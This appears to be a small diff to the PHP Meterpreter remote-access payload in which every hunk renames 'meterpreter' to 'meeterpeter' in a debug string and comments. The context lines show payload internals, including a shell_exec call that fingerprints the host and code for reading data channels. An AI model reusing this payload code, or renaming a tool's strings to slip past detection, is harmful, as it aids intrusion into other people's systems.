@@ -46,7 +46,7 @@ function my_print($str) {
     #error_log($str);
 }
 
-my_print("Evaling main meterpreter stage");
+my_print("Evaling main meeterpeter stage");
 
 # Be very careful not to put a # anywhere that isn't a comment (e.g. inside a
 # string) as the comment remover will completely break this payload
@@ -450,7 +450,7 @@ function core_machine_id($req, &$pkt) {
 
   if (is_windows()) {
     # It's dirty, but there's not really a nicer way of doing this on windows. Make sure
-    # it's lowercase as this is what the other meterpreters use.
+    # it's lowercase as this is what the other meeterpeters use.
     $output = strtolower(shell_exec("vol %SYSTEMDRIVE%"));
     $serial = preg_replace('/.*serial number is ([a-z0-9]{4}-[a-z0-9]{4}).*/s', '$1', $output);
   } else {
@@ -551,7 +551,7 @@ function channel_read($chan_id, $len) {
             # left over, they'll get it next time.  If it doesn't add up to
             # what they requested, oh well, they'll just have to call read
             # again. Looping until we get the requested number of bytes is
-            # inconsistent with win32 meterpreter and causes the whole php
+            # inconsistent with win32 meeterpeter and causes the whole php
             # process to block waiting on input.
             $bytes_needed = $len - strlen($ret);
             $ret .= substr($c['data'], 0, $bytes_needed);
